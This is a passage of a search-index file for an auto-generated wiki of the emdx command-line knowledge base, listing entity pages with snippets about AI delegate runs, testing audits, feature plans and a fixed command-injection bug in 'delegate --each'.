Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: Commands with no CLI integration tests:</p> <p>...Test dry-run mode | | <code>emdx ai ask</code> | \u274c Missing | Test with mocked Anthropic | | <code>emdx ai index</code> | \u274c Missing | Test embedding generation | | <code>emdx exec health</code> | \u274c Missing | Test health check output | | <code>emdx exec monitor</code> | \u274c Missing | Test monitoring output |...</p> </li> <li> <p>#6145 Delegate: Read gameplan by running: emdx view 6100. Implement the Sema [4/7]   Section: Key Features Implemented</p> <p>...hybrid` for explicit control</p> </li> <li><code>--extract</code> flag shows matching chunk text</li> <li> <p><code>emdx ai index</code> now builds chunk index (--chunks/--no-chunks)</p> </li> <li> <p>#6111 EMDX Feature Sprint - 7 Parallel Builds   Section: Key Insight</p> <p>...cture that was already unlocked (<code>pipx inject emdx numpy sentence-transformers</code> + <code>emdx ai index</code>). They compose well:</p> </li> <li> </li> <li> </li> <li> </li> <li> <p>#6100 Gameplan #4: Semantic Find Upgrade   Section: Implementation Steps</p> </li> <li>Current: embeds whole docs</li> <li>New: also splits into chunks and embeds each</li> <li>Chunk size target: 100-500 tokens (roughly 1-3 paragraphs)</li> <li> <p>For...</p> </li> <li> <p>#6098 Gameplan #2: Auto-Linking on Save   Section: Implementation Steps</p> <p>...so allow <code>emdx link 6100 6045</code> for manual linking</p> </li> <li> <p>Update on re-index \u2014 when <code>emdx ai index</code> runs, refresh all links</p> </li> <li> <p>#6094 EMDX Feature Deep Dive - Claude-First Design   Section: FEATURE 5: Semantic <code>emdx find</code> Upgrade</p> <p>...ngs and paragraphs, embed each chunk with a reference back to the parent doc. The <code>emdx ai index</code> command would need to build a chunk-level index.</p> </li> </ul>"},{"location":"entities/emdx-ai-index/#1-2-every-save-is-smarter","title":"1 + #2 = every save is smarter","text":""},{"location":"entities/emdx-ai-index/#3-4-every-session-start-is-smarter","title":"3 + #4 = every session start is smarter","text":""},{"location":"entities/emdx-ai-index/#5-6-7-the-kb-becomes-a-living-system","title":"5 + #6 + #7 = the KB becomes a living system","text":""},{"location":"entities/emdx-ai-index/#step-2-update-emdx-ai-index-to-build-chunk-index","title":"Step 2: Update <code>emdx ai index</code> to build chunk index","text":""},{"location":"entities/emdx-ai-index/#related-entities","title":"Related Entities","text":"<ul> <li><code>to use proze as the diff driver for *.md files...\"</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>custom diff drivers</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>ask the kb</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>#6086 \u00a7\"git integration\" (score: 0.82):</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code># #6085 \u00a7\"custom diff drivers\" (score: 0.74):</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>\"proze --setup-git configures .gitattributes and .gitconfig</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>\"git passes 7 arguments to external diff programs...\"</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>data collection</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>session management</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>security notes</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/emdx-delegate-each/","title":"emdx delegate --each","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-14</p>"},{"location":"entities/emdx-delegate-each/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6728 Wiki Generation Architecture Research [6/10]   Section: Documents (21)</p> <p>...ction in Delegate Discovery Fixed critical command injection vulnerability in <code>emdx delegate --each</code>...</p> </li> <li> <p>#6468 Security Fix Implementation for EMDX Delegate Command   Section: Summary</p> <p>Successfully implemented a critical security fix for a command injection vulnerability in the <code>emdx delegate --each</code> flag. The vulnerability allowed arbitrary command execution through unsanitized shell commands, posing a severe security risk.</p> </li> <li> <p>#6272 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [36/37]   Section: Summary</p> <p>Fixed a critical command injection vulnerability (CVE-level severity) in the <code>emdx delegate --each</code> flag, as identified in security audit document #6230.</p> </li> <li> <p>#6270 Security Fix: Command Injection in delegate --each   Section: Summary</p> <p>Fixed a critical command injection vulnerability in the <code>emdx delegate --each</code> feature and added defense-in-depth for SQL column name interpolation in migrations.</p> </li> <li> <p>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37]   Section: Summary</p> <p>Fixed a critical command injection vulnerability in the <code>emdx delegate --each</code> feature.</p> </li> <li> <p>#6257 Delegate: Document #6230 (Security Fix Implementation)   Section: Summary</p> <p>Implemented the critical security fix identified in Document #6230 (Security Audit Report) for the command injection vulnerability in <code>emdx delegate --each</code>.</p> </li> <li> <p>#6242 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [8/37]   Section: Summary</p> <p>Fixed CRITICAL command injection vulnerability in <code>emdx delegate --each</code> feature.</p> </li> <li> <p>#6240 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [4/37]   Section: Summary</p> <p>Fixed critical command injection vulnerability in <code>emdx delegate --each</code> identified in document #6230 (Security Audit Report).</p> </li> </ul>"},{"location":"entities/emdx-delegate-each/#related-entities","title":"Related Entities","text":"<ul> <li><code>fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>delegate discovery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>security fix: command injection in delegate discovery</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>security fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>bash</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>--allow-shell</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>critical command injection vulnerability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.7)</li> <li><code>testvalidatediscoverycommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>3. safe execution</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>security audit report</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/emdx-delegate-help/","title":"emdx delegate --help","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-22</p>"},{"location":"entities/emdx-delegate-help/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6839 Delegate: list   Section: 2. <code>emdx/utils/lazy_group.py</code> \u2014 Help text delegation</p> <p>Problem: <code>emdx delegate --help</code> showed incomplete help because <code>LazyCommand</code> didn't override <code>format_help()</code> \u2014 it used <code>click.MultiCommand</code>'s default instead of delegating to the real loaded command.</p> </li> <li> <p>#6838 Delegate: list [1/3]   Section: Assessment</p> <p>...`</p> </li> <li><code>emdx delegate \"analyze something\"</code> \u2192 no subcommand match, proceeds as task</li> <li> <p><code>emdx delegate --help</code> \u2192 already handled by Typer before reaching this code</p> </li> <li> <p>#6837 Delegate: list [1/2]   Section: Fix: Delegate subcommand routing (<code>list</code>, <code>running</code>, <code>stats</code>, etc.)</p> <p>...nning executions</p> </li> <li><code>emdx delegate stats</code> \u2014 correctly shows execution statistics</li> <li><code>emdx delegate --help</code> \u2014 shows all subcommands in the help listing</li> <li>All 100 delegate tests + 18 lazy loading tests pass</li> <li> <p>ruff lint + mypy type checks pass...</p> </li> <li> <p>#6836 Delegate: list   Section: Changes</p> <p><code>emdx/utils/lazy_group.py</code> (1 change):</p> </li> <li> <p>Added <code>format_help()</code> to <code>LazyCommand</code> \u2014 delegates help formatting to the real loaded command, so <code>emdx delegate --help</code> properly shows the Commands section with all subcommands listed</p> </li> <li> <p>#6833 Delegate: list   Section: Summary</p> <p>...lazy-loaded commands</p> </li> <li> <p>Added <code>format_help()</code> method to <code>LazyCommand</code> so that <code>emdx delegate --help</code> properly delegates to the real (loaded) command's help formatter, showing the full help text including subcommands</p> </li> <li> <p>#6830 Delegate: --help [2/2]</p> <p><code>emdx/utils/lazy_group.py</code>:</p> </li> <li> <p>Added <code>format_help()</code> method to <code>LazyCommand</code> that delegates to the real loaded command, ensuring <code>emdx delegate --help</code> renders the full help text from the actual command rather than the lazy wrapper's stub.</p> </li> <li> <p>#6829 Delegate: --help [2/2]   Section: Summary</p> <p>The changes in the working tree fix two related issues with <code>emdx delegate --help</code>:</p> </li> <li> <p>#6828 Delegate: --help [2/2]</p> <ol> <li><code>emdx delegate --help</code> shows the full docstring with usage examples.</li> </ol> </li> <li> <p>#6827 Delegate: --help [2/2]   Section: Summary</p> <p>...hecks passed</p> </li> <li><code>mypy</code> \u2014 no issues</li> <li><code>pytest -k delegate</code> \u2014 100/100 tests passed</li> <li><code>emdx delegate --help</code> \u2014 shows full help with examples and subcommands</li> <li><code>emdx delegate list</code> \u2014 correctly routes to the <code>list</code> subcommand</li> <li> <p><code>emdx --help</code> \u2014 shows \"One-shot AI execution (p...</p> </li> <li> <p>#6788 Delegate: --help [2/2]</p> <p>Lint passes cleanly, imports work, and <code>emdx delegate --help</code> renders a well-structured output.</p> </li> </ul>"},{"location":"entities/emdx-delegate-help/#related-entities","title":"Related Entities","text":"<ul> <li><code>invoke_without_command=true</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=6.4)</li> <li><code>typer.typer()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>tasks[0]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>[tasks]...</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>emdx delegate stats</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>emdx delegate list --limit 5</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>emdx delegate list --limit 3</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>click.multicommand.get_command()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>click.multicommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>emdx/utils/lazy_group.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> </ul>"},{"location":"entities/emdx-delegate/","title":"emdx delegate","text":"<p>Type: tech_term | Mentioned in: 54 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdx-delegate/#documents-54","title":"Documents (54)","text":"<ul> <li>#6862 Delegate: Audit README.md: Read the full README.md and check every CLI [1/3]   Section: Issues Found <p>Issue 2 \u2014 Line 91-92: <code>emdx delegate 61</code> undocumented behavior</p> </li> </ul> <pre><code>$ emdx delegate 61\n</code></pre> <p>This executes a document by ID as a prompt. The <code>delegate --help</code> confirms this works (\"Numeric args load...</p> <ul> <li> <p>#6838 Delegate: list [1/3]</p> <p>Now I see the pattern clearly. The user is testing <code>emdx delegate \"list\" \"--limit\" \"3\"</code> (or similar) \u2014 passing subcommand names as task prompts. This is the bug where subcommand names get swallowed as task arguments because of `inv...</p> </li> <li> <p>#6836 Delegate: list   Section: Summary</p> <p>The <code>emdx delegate</code> command now supports subcommands (<code>list</code>, <code>running</code>, <code>stats</code>, <code>show</code>, <code>logs</code>, <code>tail</code>, <code>kill</code>, <code>killall</code>, <code>health</code>, <code>monitor</code>) that were previously only accessible via <code>emdx exec</code> (now folded into delegate).</p> </li> <li> <p>#6825 Delegate: --help [2/2]</p> <p>My job as a delegate is to execute the prompt <code>--help</code> \u2014 which in context means to provide help/documentation about the <code>emdx delegate</code> command. Let me generate the comprehensive help output.</p> </li> <li> <p>#6728 Wiki Generation Architecture Research [6/10]   Section: Recommendation: Three-Tier Scoring with Noise Filtering</p> <p>...t | Example | |----------|-------|---------| | CLEAN | 532 | <code>command injection</code>, <code>emdx delegate</code> | | PY_FILE | 173 | <code>delegate.py</code>, <code>tasks.py</code> | | FILE_PATH | 115 | <code>emdx/commands/delegate.py</code> | | FUNC_CALL | 53 | <code>_run_discovery()</code>, <code>shlex.split()</code> | | CLI_FLA...</p> </li> <li> <p>#6717 Wiki Generation Architecture Research [4/10]   Section: Executive Summary</p> <p>The emdx knowledge base (687 docs, ~38 MB, growing daily via <code>emdx save</code> and <code>emdx delegate</code>) needs a dynamic auto-wiki that stays current without full regeneration. After analyzing the existing codebase \u2014 entity extraction, TF-IDF clustering, document link...</p> </li> <li> <p>#6714 Wiki Generation Architecture Research [10/10]   Section: Delegate integration:</p> <p>```bash</p> </li> </ul>"},{"location":"entities/emdx-delegate/#generate-via-delegate-long-running-background","title":"Generate via delegate (long-running, background)","text":"<p>$ emdx delegate \"run emdx wiki generate --all --no-confirm\"</p> <ul> <li> <p>#6692 FEAT-12: Add --retry flag to delegate   Section: Implementation Complete</p> <p>The <code>--retry N</code> flag for <code>emdx delegate</code> has been implemented and committed on branch <code>delegate/feat-12-add---retry-flag-to-delegate-377b2</code>.</p> </li> <li> <p>#6677 Delegate Slimming Research [2/3]   Section: Conflict 7: \"NEVER use the Task tool\" (Both CLAUDE.md files)</p> <p>Project CLAUDE.md line 154, User CLAUDE.md line 65: NEVER use the Task tool to spawn sub-agents. Use <code>emdx delegate</code> instead.</p> </li> <li> <p>#6670 Prime Command Redesign Research [synthesis]   Section: Three Key Insights</p> <p>...ks</p> </li> <li>Recursive delegation (MEDIUM): Command reference teaches delegates about <code>emdx delegate</code>, enabling unbounded sub-agent recursion</li> <li>Wrong git context (MEDIUM): Shows parent branch state, not the worktree the delegate actually operates in</li> <li> <p>**Token wa...</p> </li> <li> <p>#6669 Prime Command Redesign Research [1/3]   Section: What Tools Explicitly Do NOT Include (To Avoid Confusion)</p> <p>...sub-agents** \u2014 This is where emdx's current prime fails. Teaching delegates about <code>emdx delegate</code> enables unbounded recursion.</p> </li> <li> <p>No tasks/work outside current scope \u2014 Cursor's glob-scoped rules only show when relevant. Aider shows only symbols related to ch...</p> </li> <li> <p>#6661 Prime Command Redesign Research [2/3]   Section: Section-by-section classification</p> <p>...MMANDS (full prime) | ~12 | Useful \u2014 quick reference | Mostly harmful \u2014 <code>emdx delegate</code> docs teach the sub-agent to spawn its own sub-agents (recursive delegation). <code>emdx task add</code> encourages creating new tasks when the sub-agent should just do its j...</p> </li> <li> <p>#6649 Delegate: README Tools-It-Replaces Angle [3/10]   Section: emdx</p> <p>...-mode semantic<code>,</code>emdx find --ask<code>| | **Agent orchestrator** (CrewAI, AutoGen) |</code>emdx delegate<code>,</code>emdx delegate --pr` |</p> </li> <li> <p>#6647 Delegate: Document #6643 (README Rewrite Strategy for 0.19.0): Before/After Contrast [2/10]   Section: The fix</p> <p>...t cause | | Session ends. Findings gone. | <code>emdx save</code> \u2014 findings persisted | | | <code>emdx delegate</code> \u2014 3 agents audit related code | | | <code>emdx task add</code> \u2014 remaining work tracked | | Next day: start from scratch | Next day: <code>emdx prime</code> | | Re-read the same files |...</p> </li> <li> <p>#6608 Delegate: Remove the --each/--do dynamic discovery feature from emdx d   Section: Summary</p> <p>Removed the <code>--each</code>/<code>--do</code> dynamic discovery feature from <code>emdx delegate</code>. This feature allowed running a shell command to discover items at runtime and then dispatching a delegate task per item (e.g., `emdx delegate --each \"fd -e py src/...</p> </li> <li> <p>#6596 Delegate: Research import paths \u2014 how should emdx import from Obsidian [3/4]   Section: Key Differentiators vs. Just Using Obsidian</p> <ol> <li>AI-native: <code>emdx delegate</code> parallelizes Claude tasks, results persist</li> </ol> </li> <li>CLI-first: No GUI needed, works in SSH sessions, scriptable</li> <li> <p>Task management: Built-in task system with bloc...</p> </li> <li> <p>#6572 Delegate: List the 3 most important files in emdx/services/ and say on [2/2]   Section: 3 Most Important Files in emdx/services/</p> </li> <li> <p>#6567 Delegate synthesis [synthesis]   Section: Executive Summary</p> <p>The <code>emdx delegate</code> command is EMDX's unified interface for AI-powered task execution. It combines Claude CLI execution, git worktree isolation, parallel processing, and knowledge base persistence into a single, composable command.</p> </li> <li> <p>#6565 Delegate: Look at the synthesis_service.py \u2014 how does --synthesize wor [3/3]   Section: Overview</p> <p>The <code>--synthesize</code> flag in <code>emdx delegate</code> enables automatic synthesis of parallel task outputs into a unified summary document. This analysis traces the complete flow from CLI option to final summary.</p> </li> <li> <p>#6559 Delegate: Document #6543 (Delegate Enhancement Gameplans [2/5]):</p> </li> </ul>"},{"location":"entities/emdx-delegate/#1-unified_executorpy","title":"1. <code>unified_executor.py</code>","text":"<p>The core execution engine that runs Claude CLI tasks with real-time log streaming \u2014 this powers the critical <code>emdx delegate</code> command that spawns parallel sub-agents.</p>"},{"location":"entities/emdx-delegate/#im","title":"Im","text":"<p>Section: Summary</p> <p>Successfully implemented the <code>--retry N</code> flag for <code>emdx delegate</code> to handle transient failures (timeouts, rate limits) with exponential backoff.</p> <ul> <li> <p>#6556 Delegate: --memory N flag implementation   Section: Summary</p> <p>Successfully implemented the <code>--memory N</code> flag for <code>emdx delegate</code> that injects the N most recent delegate output documents as context into the prompt. This enables agents to build on prior work without manually searching the knowledge base.</p> </li> <li> <p>#6548 Delegate: Write a CHANGELOG entry for the cascade removal (PR #651). F [5/6]   Section: Changes Made</p> <p>...ascade` command group (new, list, advance, auto, status)</p> </li> <li><code>--chain</code> flag from <code>emdx delegate</code></li> <li>Cascade-related database tables and TUI screens</li> <li> <p>Included migration guidance showing users how to use the recipe system instead</p> </li> <li> <p>#6546 Delegate Enhancement Gameplans [synthesis]   Section: Key Findings by Feature</p> </li> <li> <p>#6543 Delegate Enhancement Gameplans [2/5]   Section: Executive Summary</p> <p>Add retry-with-exponential-backoff capability to <code>emdx delegate</code> for handling transient failures (timeouts, rate limits). The implementation wraps the existing <code>execute()</code> call in <code>_run_single()</code> with a retry loop, preserving tas...</p> </li> <li> <p>#6541 Delegate Enhancement Gameplans [3/5]   Section: Summary</p> <p>Add a <code>--memory N</code> flag to <code>emdx delegate</code> that injects the N most recent delegate output documents as context into the prompt. This enables agents to build on prior work without manually searching the knowledge base.</p> </li> <li> <p>#6534 EMDX Future Directions: Agent-First Design [2/4]   Section: 2. Agent Output Diff View</p> <p>...o approve changes, <code>r</code> to reject, <code>e</code> to edit before accepting</p> </li> <li> <p>Integration with <code>emdx delegate --pr</code> to show staged git changes</p> </li> <li> <p>#6535 EMDX Future Directions: Agent-First Design [4/4]   Section: 1. Auto-Gameplan from GitHub Issues (Critical Path)</p> <p>...<code>github, issue-123, gameplan, needs-review</code></p> </li> <li> <p>Human reviews gameplan \u2192 approves \u2192 <code>emdx delegate --doc &lt;gameplan_id&gt; --pr</code></p> </li> <li> <p>#6532 EMDX Future Directions: Agent-First Design [3/4]   Section: Executive Summary</p> <p>After studying <code>emdx delegate</code> and its ecosystem, I've identified concrete enhancement opportunities that would make the system more powerful for production-grade agent orchestration\u2014without addi...</p> </li> <li> <p>#6482 Delegate: Kink 6: Add basic PR validation to emdx/commands/delegate.py [3/3]   Section: Behavior</p> <p>When <code>--pr</code> flag is used with <code>emdx delegate</code>:</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Overview</p> <p>...t now serves as the persistent record of all AI delegations, centering around the <code>emdx delegate</code> command for execution and task management.</p> </li> <li> <p>#6410 Delegate: Research and design structured metadata for emdx save and de [2/2]   Section: CLI Interface Changes</p> </li> <li>Auto-populate <code>source_task_id</code> from task tracking</li> <li>Auto-populate <code>execution_id</code> from execution record</li> <li> <p>Auto-populate <code>session_id</code> from <code>CLAUDE_SESSION_ID</code> env var</p> </li> <li> <p>#6398 Delegate synthesis [synthesis]   Section: 4. The Delegate Pattern is Central</p> <p><code>emdx delegate</code> is the primary agent interface, acting as a proxy that:</p> </li> <li>Wraps Claude execution with KB persistence</li> <li>Auto-creates tasks and tracks executions</li> <li> <p>Handles parallel,...</p> </li> <li> <p>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: Agent Patterns</p> <p>Input Methods:</p> </li> <li><code>echo \"output\" | emdx save --title \"...\" --tags \"...\"</code> \u2014 programmatic save</li> <li><code>emdx delegate \"task\"</code> \u2014 auto-saves output to KB</li> <li>Never uses <code>emdx edit</code> (no interactive editing)</li> <li> <p>Never uses GUI</p> </li> <li> <p>#6365 Gameplan: emdx delegate --draft-pr mode   Section: Summary</p> <p>Add <code>--draft</code> flag to <code>emdx delegate</code> that modifies <code>--pr</code> behavior to create draft PRs instead of regular PRs. This enables a review-first workflow where delegate output gets human review before merge.</p> </li> <li> <p>#6308 Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]   Section: 2. Overly Complex Parameter Signatures</p> <p><code>emdx delegate</code> command (16 parameters):</p> </li> </ul> <pre><code>--tags, --title, --synthesize, --jobs, --model, --quiet, --doc,\n--pr, --worktree, --base-branch, --chain, --each, --do\n</code></pre> <ul> <li> <p>This is actually well-designed - each option serves a distinct purpose</p> </li> <li> <p>#6263 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [28/37]   Section: Summary</p> <p>Fixed the critical command injection vulnerability identified in the security audit. The <code>--each</code> flag in <code>emdx delegate</code> previously passed user input directly to a shell subprocess (<code>shell=True</code>), enabling arbitrary command execution.</p> </li> <li> <p>#6251 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [16/37]   Section: Summary</p> </li> <li> <p>#6238 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [6/37]   Section: Security Fix: Command Injection in Delegate Discovery</p> <p>Issue: CRITICAL - The <code>--each</code> flag in <code>emdx delegate</code> was vulnerable to command injection due to using <code>shell=True</code> with user-provided input.</p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 5. MISSING CLI INTEGRATION TESTS</p> <p>...| | <code>emdx find</code> | Basic search | <code>--sort</code>, <code>--limit</code>, <code>--offset</code>, <code>--project</code> | | <code>emdx delegate</code> | Unit tests only | Full CLI integration with mocked executor | | <code>emdx tag</code> | Add/remove/list | <code>rename</code>, <code>merge</code>, <code>batch</code> |</p> </li> <li> <p>#6222 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: Commands with partial CLI tests:</p> <p>...gs, batch operations | | <code>emdx group</code> | Has tests | Full CRUD coverage exists | | <code>emdx delegate</code> | Has tests | Error handling could be expanded |</p> </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: Executive Summary</p> <p>...how the activity browser displays delegate executions, tracing the data flow from <code>emdx delegate</code> command through to the UI display. **Key finding: There are several mismatches and potential display bugs between what delegate writes and what the activity browser...</p> </li> <li> <p>#6191 Delegate: analysis [3/3]   Section: Key Features</p> </li> <li>Single task: <code>emdx delegate \"analyze the auth module\"</code></li> <li> <p>**Parallel executio...</p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Executive Summary</p> <p>...evolved from the workflow system into a more streamlined approach centered on the <code>emdx delegate</code> command, with tasks serving as the persistent record of execution history.</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: How Delegate Uses These Systems</p> <p>When <code>emdx delegate</code> runs:</p> </li> <li> <p>#6169 Delegate: Analyze the task runner service. Read emdx/services/task_run [3/15]   Section: Relationship to <code>emdx delegate</code></p> Aspect <code>emdx task run</code> <code>emdx delegate</code> Execution Mode Background (detached) Foreground (sync) Output To log file only stdout + saved... </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: Task System Architecture</p> <p>...ment</p> </li> <li><code>depends_on</code>: dependency graph via <code>task_deps</code> table</li> <li> <p>Fields for tracking <code>emdx delegate</code> executions: <code>prompt</code>, <code>execution_id</code>, <code>output_doc_id</code></p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Summary</p> <p>This enables <code>emdx delegate</code> to track parallel tasks, chain executions, retries, and their outputs in a queryable structure.</p> </li> <li> <p>#6166 Delegate: Analyze how tasks integrate with cascade. Read emdx/commands [5/15]   Section: Current State</p> <p>...ies</p> </li> <li>Tracking: <code>tasks</code> table + <code>task_executions</code> table</li> <li>Automation: Via <code>emdx delegate</code> which creates task records</li> <li>Features: </li> <li>Dependency management with cycle detection</li> <li>Gameplan association (<code>gameplan_id</code>)</li> <li> <p>Progress logging (<code>task_log</code>...</p> </li> <li> <p>#6163 Delegate: Analyze the emdx task CLI commands. Read emdx/commands/tasks [2/15]   Section: Subcommand Analysis</p> <p>Implementation: \u26a0\ufe0f Partial. </p> </li> <li>Generates an <code>emdx delegate</code> command from task metadata (prompt, tags, source_doc_id)</li> <li>Does NOT actually execute \u2014 just prints the command to copy/paste</li> <li> <p>Requires task to have a <code>prompt</code> field set</p> </li> <li> <p>#6164 Delegate: Audit CLAUDE.md (578 lines) for accuracy. Check: (1) does it [6/17]   Section: Audit Checklist Results</p> <p>...64-178) \u2705 PASS - The decision tree is accurate now that workflows are gone:</p> </li> <li><code>emdx delegate</code> (all execution) - Correct</li> <li><code>emdx cascade</code> (autonomous) - Correct</li> <li> <p><code>emdx recipe run</code> (saved instructions) - Correct</p> </li> <li> <p>#6158 Delegate: analysis [5/5]   Section: Key Features</p> </li> <li>Single task: <code>emdx delegate \"analyze X\"</code></li> <li>Parallel: Up to 10 concurrent tasks</li> <li> <p>Chain: Sequential pipeline...</p> </li> <li> <p>#6154 Delegate: analysis [3/3]   Section: Key Features</p> </li> <li>Single tasks: <code>emdx delegate \"analyze auth\"</code></li> <li> <p>Parallel tasks: `emdx delegate \"t1\" \"t2...</p> </li> <li> <p>#6111 EMDX Feature Sprint - 7 Parallel Builds   Section: What We're Doing</p> <p>Building 7 new emdx features in parallel using <code>emdx delegate --pr</code>. Each delegate agent reads its gameplan doc, implements the feature in the emdx codebase, and creates a PR.</p> </li> </ul>"},{"location":"entities/emdx-delegate/#2-retry-n-flag-for-emdx-delegate","title":"2. <code>--retry N</code> Flag for <code>emdx 